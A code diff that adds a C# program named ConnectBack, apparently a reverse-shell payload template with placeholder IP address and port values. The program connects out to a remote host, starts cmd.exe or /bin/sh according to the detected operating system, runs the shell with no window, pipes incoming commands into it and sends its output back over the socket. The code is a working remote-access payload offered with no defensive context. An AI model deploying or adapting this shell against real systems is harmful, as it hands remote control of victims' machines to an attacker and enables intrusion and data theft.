@@ -1,0 +1,72 @@
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Sockets;
+
+namespace ConnectBack
+{
+    public class Program
+    {
+        static StreamWriter streamWriter;
+
+        public static void Main(string[] args)
+        {
+            string host = "__IPADDR__";
+            int port = __PORT__;
+            string shell = Environment.OSVersion.Platform == PlatformID.Win32NT ? "cmd.exe" : "/bin/sh"; // Auto-detect OS
+
+            try
+            {
+                using (TcpClient client = new TcpClient(host, port))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream) { AutoFlush = true };
+
+                            Process p = new Process();
+                            p.StartInfo.FileName = shell;  // Dynamically selects cmd.exe (Windows) or /bin/sh (Linux)
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+
+                            while (true)
+                            {
+                                string command = rdr.ReadLine();
+                                if (string.IsNullOrEmpty(command)) continue;
+
+                                p.StandardInput.WriteLine(command);
+                                p.StandardInput.Flush();
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            if (!string.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    streamWriter.WriteLine(outLine.Data);
+                }
+                catch (Exception) { }
+            }
+        }
+    }
+}
+
